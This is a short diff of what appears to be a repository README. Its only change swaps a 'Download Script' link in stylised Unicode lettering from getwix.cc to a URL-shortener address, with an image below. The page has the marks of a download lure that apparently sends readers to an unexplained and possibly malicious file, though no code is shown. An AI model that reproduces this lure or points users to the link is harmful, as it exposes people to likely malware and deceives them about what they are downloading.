@@ -1,6 +1,6 @@
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.cc/)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://getwix.short.gy/main)***
 
 
 ![maxresdefault](https://github.com/user-attachments/assets/1853dc94-57de-4ac3-8457-66fea2f6c905)
